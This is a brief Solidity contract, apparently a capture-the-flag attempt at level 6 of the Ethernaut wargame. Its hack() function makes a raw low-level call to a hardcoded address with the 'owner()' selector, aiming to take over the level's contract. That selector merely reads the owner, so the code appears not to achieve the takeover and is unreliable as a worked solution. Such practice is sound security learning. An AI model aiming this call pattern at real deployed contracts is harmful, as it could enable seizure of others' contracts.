// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract Ethernaut06 {
    address contractAddress = 0xA8deFFE2505C7794c096d22e4240777570740391;

    constructor() {}

    function hack() public {
        contractAddress.call(abi.encodeWithSignature("owner()"));
    }
}